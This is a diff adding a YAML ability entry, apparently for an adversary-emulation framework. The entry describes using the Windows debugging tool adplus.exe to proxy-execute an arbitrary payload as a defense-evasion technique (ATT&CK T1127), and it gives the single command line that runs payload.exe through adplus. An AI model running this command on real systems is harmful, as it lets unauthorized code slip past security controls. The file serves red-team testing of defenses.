@@ -1,0 +1,25 @@
+- id: af503bad-857d-3ba3-8b0f-847ba2ebcc80
+  name: adplus.exe - Execute arbitrary commands and binaries from the context of adplus.
+    Note that providing an output directory via '-o' is required.
+  description: Execute arbitrary commands and binaries from the context of adplus.
+    Note that providing an output directory via '-o' is required.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1127
+    name: System Binary Proxy Execution
+  platforms:
+    windows:
+      cmd:
+        command: adplus.exe -crash -o "#{host.dir.temp}" -sc payload.exe
+        payloads:
+        - payload.exe
+  singleton: false
+  privilege: User
+  repeatable: true
+  buckets:
+  - defense-evasion
+  version: '1.0'
+  author: mr.d0x
+  created: '2021-09-01'
+  modified: '2021-09-01'
+  operating_system: Windows All Versions
